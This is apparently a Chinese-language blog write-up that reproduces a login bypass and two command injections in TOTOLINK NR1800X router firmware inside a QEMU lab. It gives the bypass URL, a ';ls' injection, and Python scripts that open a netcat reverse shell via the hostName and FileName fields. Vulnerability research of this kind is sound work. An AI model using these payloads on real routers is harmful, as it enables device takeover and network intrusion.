---
title: 'TOTOLINK NR1800X 固件模拟、登录绕过与命令注入复现'
description: '记录 TOTOLINK NR1800X 固件解包、MIPS QEMU 系统级模拟、后台登录绕过、OpModeCfg 和 UploadFirmwareFile 命令注入复现。'
tags:
  - CVE
  - IoT
  - firmware
  - command-injection
  - TOTOLINK
  - QEMU
  - pwn
categories:
  - CVE
abbrlink: 413754f4
permalink: posts/totolink-nr1800x-firmware-auth-bypass-command-injection/
date: 2025-12-07 18:07:00
top_img: transparent
---
 
## 环境
[[CVE]]
[固件下载]https://www.totolink.net/data/upload/20220412/f08f694a4322b1e8463abb3d41d21688.rar)
Ubuntu22
IDA9.1
binwalk
qemu
[[firmwalker]]


## 固件模拟

binwalk 解包
~~~ bash
binwalk -Me TOTOLINK_C834FR-1C_NR1800X_IP04469_MT7621A_SPI_16M256M_V9.1.0u.6279_B20210910_ALL.web
~~~
![image.png](https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/20251125152943421.png)

firmwalker 分析
![image.png](https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/20251125152908387.png)

![image.png](https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/20251125152906205.png)

readelf  分析busybox
~~~ bash
readelf -h ./bin/busybox
~~~
![image.png](https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/20251125153043034.png)
mips架构，小端序

先在宿主机配置网卡，用于后面和qemu模拟出来的虚拟机进行通信
~~~ sh
sudo brctl addbr virbr0
sudo ifconfig virbr0 192.168.2.1/24 up
sudo tunctl -t tap0
sudo ifconfig tap0 192.168.2.11/24 up
sudo brctl addif virbr0 tap0
~~~
在模拟前需要先[下载](https://people.debian.org/~aurel32/qemu/armhf/)以下内容
~~~
vmlinux-3.2.0-4-4kc-malta 内核镜像文件 
debian_squeeze_mipsel_standard.qcow2 虚拟磁盘映像文件
~~~
系统级模拟
~~~ bash
sudo qemu-system-mipsel -M malta \
-kernel vmlinux-3.2.0-4-4kc-malta \
-hda debian_squeeze_mipsel_standard.qcow2 \
-append "root=/dev/sda1 console=tty0" -nographic \
-net nic -net tap,ifname=tap0,script=no,downscript=no
~~~
在qemu模拟的虚拟机中配置网络，使其宿主机和虚拟机进行通信
~~~ bash
ifconfig eth0 192.168.2.12 up
~~~

将squashfs-root压缩后传入虚拟机中并解压
~~~ bash
tar -zcvf squashfs-root.gz squashfs-root
scp squashfs-root.gz root@192.168.2.12:/
tar -zxvf squashfs-root.gz
~~~
进入shell
~~~ bash
chroot ./squashfs-root sh
~~~

web服务为：/usr/sbin/lighttpd，我们先直接启动进行尝试

![image.png](https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/20251125162256322.png)
需要config，使用grep搜索相关文件
```bash
grep -ir "lighttpd"
```
![image.png](https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/20251125165709119.png)
有直接对应的lighttpd.conf配置文件，直接加载即可
~~~ bash
./usr/sbin/lighttpd -f ./lighttp/lighttpd.conf
~~~
![image.png](https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/20251125170549518.png)
报错 /var/run/lighttpd.pid没有这样的文件或目录
手动进行创建
~~~ bash
cd ./var 
mkdir run 
cd run 
touch lighttpd.pid
~~~
![image.png](https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/20251130194931526.png)
成功启动

## 漏洞复现
### 登录绕过
拦截请求包分析内容
![image.png](https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/20251130195120874.png)
关键字 **formLoginAuth.htm?authCode** 使用grep进行搜索
~~~ sh
grep -ir "formLoginAuth.htm?authCode"
~~~

![image.png](https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/20251130195324633.png)
对 **cstecgi.cgi** 进行分析
![image.png](https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/20251130195601583.png)
搜索字符串
![image.png](https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/20251130201748801.png)
获取用户名、密码、flag，根据请求包分析用户名固定为admin，密码为输入
![image.png](https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/20251130201724078.png)

获取路由器后台的账号密码
![image.png](https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/20251130201813877.png)
127行 判断flag是否为1，则将后台的name赋值给传入的name，根据请求包猜测为用户名是否有进行设置，否则直接使用admin传入
129行 进行用户名和密码的判断
130行 如果-`ren_qing_style`为1且密码为空则也可以登录
132-150行 认证成功后判断当前设备类型
![image.png](https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/20251130202443709.png)
认证失败则v18赋值为0
![image.png](https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/20251130202535086.png)
构造响应内容，也就是前面bp接受的内容

我们接着继续分析**lighttpd**中的**Form_Login**
![image.png](https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/20251130204624146.png)
依次来获取对应值

![image.png](https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/20251130205251208.png)
**home.html_3**为goURL
**home.html_2**为flag
如果goURL为空的话，根据flag的值进行跳转页面
![image.png](https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/20251130205415481.png)
判断v8，实际上就是判断authCode，认证是否通过
总结:是否有`authCode`值，来决定是否进入`home.html`主界面，否则就返回到`login.html`界面，所以我们构造访问url就可以直接绕过登录了
~~~php
192.168.2.12/formLoginAuth.htm?authCode=1&userName=admin&goURL=home.html&action=login
~~~
将authCod设为1，且goURL为home.html进行跳转

### OpModeCfg命令注入 
漏洞点在 **cstecgi.cgi** 中的 **hostName** 传入后过滤不严谨，使其执行dosystem
![image.png](https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/20251201144811466.png)
![image.png](https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/20251201145022311.png)
![image.png](https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/20251201145032764.png)
且需要执行到这边，需要n6不能等于0、3、4、6
![image.png](https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/20251201145135534.png)
且n6是获取的proto，输入5即可

漏洞点在**sub_421C98**函数中我们按x交叉引用找到上一个函数
![image.png](https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/20251201183639992.png)
![image.png](https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/20251201183649916.png)
调用链也就是 sub_42B9F8->sub_422F3C->sub_421C98
那么是如何调用到sub_42B9F8
![image.png](https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/20251201183804069.png)

![image.png](https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/20251201183850333.png)
首先在main函数中有获取 **topicurl** 根据内容进行匹配对应函数
![image.png](https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/20251201183943805.png)
其中在while循环中会在get_handle_t搜索是否有对应的地址进行跳转
![image.png](https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/20251201195126649.png)
![image.png](https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/20251201195132955.png)
当 **topicurl** 为 **setOpModeCfg** 时会跳转到 **sub_42B9F8** 也就是我们需要利用得函数位置，此时我们bp拦截请求包，再修改内容
topicurl=setOpModeCfg
proto=5
hostname=';ls ../../;'
![image.png](https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/20251201195527097.png)
成功
#### rce
![image.png](https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/20251201201845665.png)
设置监听
![image.png](https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/20251201202208721.png)
![image.png](https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/20251201202245971.png)
![image.png](https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/20251201202357619.png)
~~~ python
import requests
url = "http://192.168.2.12:80/cgi-bin/cstecgi.cgi"
cookie = {"Cookie":"SESSION_ID=2:1764591470:2"}
data = {"topicurl" : "setOpModeCfg",
"proto" : "8",
"switchOpMode" : "1",
"hostName" : "';/bin/busybox nc 192.168.2.11 4444 -e /bin/sh;'"}
response = requests.post(url, cookies=cookie, json=data)
print(response.text)
print(response)
~~~

### UploadFirmwareFile命令注入
和上面一样通过**topicurl** 为 **UploadFirmwareFile** 时会跳转到 **sub_42D3B4** 
![02d99a3a-7c68-4eb9-8e33-daed02510a52.png](https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/02d99a3a-7c68-4eb9-8e33-daed02510a52.png)
且在接收 **FullName** 时无过滤，执行 **dosystem**

#### rce
![image.png](https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/20251201204507757.png)
~~~ python
import requests
url = "http://192.168.2.12:80/cgi-bin/cstecgi.cgi"
cookie = {"Cookie":"SESSION_ID=2:1764591470:2"}
data = {'topicurl' : "UploadFirmwareFile",
"FileName" : "$(/bin/busybox nc 192.168.2.11 4444 -e /bin/sh)"}
response = requests.post(url, cookies=cookie, json=data)
print(response.text)
print(response)
~~~


